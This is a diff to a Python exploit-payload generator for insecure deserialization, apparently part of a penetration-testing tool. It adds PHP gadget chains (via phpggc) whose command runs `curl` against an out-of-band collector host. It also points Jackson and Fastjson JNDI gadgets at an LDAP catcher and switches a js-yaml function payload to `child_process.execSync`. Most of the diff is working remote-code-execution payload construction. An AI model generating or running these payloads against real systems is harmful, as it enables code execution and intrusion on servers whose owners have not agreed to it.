@@ -8,7 +8,7 @@ import urllib.request
 from urllib.parse import urlparse
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from tool_config import get_tool_path, get_oob_domain
+from tool_config import get_tool_path, get_oob_domain, get_oob_ldap_target
 from Utility.schemas import ExploitResult, MutationVector, Mutations, MutationPayload
 
 _JAVA_AVAILABLE: bool | None = None
@@ -72,9 +72,9 @@ class PayloadMutation:
         if self.probe == "urldns_probe":
             return self._mutate_java_urldns() + self._mutate_java_rce_escalation()
         if self.probe in ("gadget_chain", "magic_method"):
-            return self._php_mutation()
+            return self._php_mutation() + self._mutate_php_oob()
         if self.probe in ("flip_boolean", "modify_string","modify_integer"):
-            return self.__mutated_php_choose() + [m for m in self._php_mutation() if "error" not in m]
+            return self.__mutated_php_choose() + [m for m in self._php_mutation() if "error" not in m] + self._mutate_php_oob()
         if self.probe == "pickle_exec":
             return self._mutate_pickle() + self._mutate_pickle_oob()
         if self.probe == "jsonpickle_exec":
@@ -293,10 +293,11 @@ class PayloadMutation:
                 "hint": "Set 'oob_domain' in config.json (or ETHICALQUOC_OOB_DOMAIN) to your Interactsh/Burp Collaborator subdomain",
             }]
 
+        ldap_target = get_oob_ldap_target()  # host:LDAP-port/token (catcher), not the HTTP port
         results: Mutations = []
         all_gadgets = self.JACKSON_OOB_GADGETS + self.JACKSON_OOB_GADGETS_GENERIC_BYPASS
         for gadget_class, template in all_gadgets:
-            raw = template.format(domain=oob_domain)
+            raw = template.format(domain=ldap_target)
             b64 = base64.b64encode(raw.encode()).decode()
             payload = self._make_payload("jackson_oob", gadget_class, None, b64)
             payload["payload_raw"] = raw
@@ -334,9 +335,10 @@ class PayloadMutation:
                 "hint": "Set 'oob_domain' in config.json (or ETHICALQUOC_OOB_DOMAIN) to your Interactsh/Burp Collaborator subdomain",
             }]
 
+        ldap_target = get_oob_ldap_target()  # host:LDAP-port/token (catcher), not the HTTP port
         results: Mutations = []
         for gadget_class, template in self.FASTJSON_OOB_GADGETS:
-            raw = template.format(domain=oob_domain)
+            raw = template.format(domain=ldap_target)
             b64 = base64.b64encode(raw.encode()).decode()
             payload = self._make_payload("fastjson_oob", gadget_class, None, b64)
             payload["payload_raw"] = raw
@@ -577,8 +579,38 @@ class PayloadMutation:
             if key.lower() in self.etype.lower() and chain:
                 return chain
         return ["Monolog/RCE1", "Laravel/RCE1", "Symfony/RCE1"]
-    
-    
+
+
+    # Command-exec phpggc types usable for an OOB call-out (unlink can't curl).
+    PHP_OOB_TYPES = ("system", "exec", "passthru")
+
+    def _mutate_php_oob(self) -> Mutations:
+        """Blind-confirmation variant for PHP object injection: build phpggc POP chains whose
+        command curls the OOB collector over HTTP (the per-vector token is already baked into the
+        domain by serve.py, so {oob_domain} is e.g. host:9000/<token>). A sink whose command output
+        never surfaces in the response can still be confirmed by a callback. Mirrors the Java/.NET
+        OOB canaries — without this, PHP only ran local `whoami`, whose output the tool can read
+        only in-band. No-op unless an OOB domain is configured (and phpggc/php are available)."""
+        oob_domain = get_oob_domain()
+        if not oob_domain or not os.path.exists(self.PHPGGC_PATH):
+            return []
+        url = f"http://{oob_domain}/"
+        cmd = f"curl {url}"
+        results: Mutations = []
+        for chain in self.__resolve_php_chain():
+            for ptype in self.PHP_OOB_TYPES:
+                result = self._run_phpggc(chain, ptype, cmd)
+                if result:
+                    payload = self._make_payload("php_object_oob", chain, cmd, result)
+                    payload["note"] = (
+                        f"Blind OOB canary — when unserialize() fires this POP chain the target runs "
+                        f"`{cmd}`; check the collector log for this vector's token to confirm the sink "
+                        "executed (needs the gadget library, e.g. monolog, loaded on the target)."
+                    )
+                    results.append(payload)
+        return results
+
+
     def _read_php_token(self, payload: str, pos: int) -> dict | None:
         if pos >= len(payload):
             return None
@@ -889,7 +921,7 @@ class PayloadMutation:
         for cmd in self.NODEJS_TEST_COMMANDS:
             raw = (
                 "hook: !<tag:yaml.org,2002:js/function> "
-                f'"function(){{ return global.process.mainModule.require(\'child_process\').exec(\'{cmd}\'); }}"'
+                f'"function(){{ return global.process.mainModule.require(\'child_process\').execSync(\'{cmd}\').toString() }}"'
             )
             b64 = base64.b64encode(raw.encode()).decode()
             payload = self._make_payload("yaml_js_function", "js-yaml !!js/function", cmd, b64)
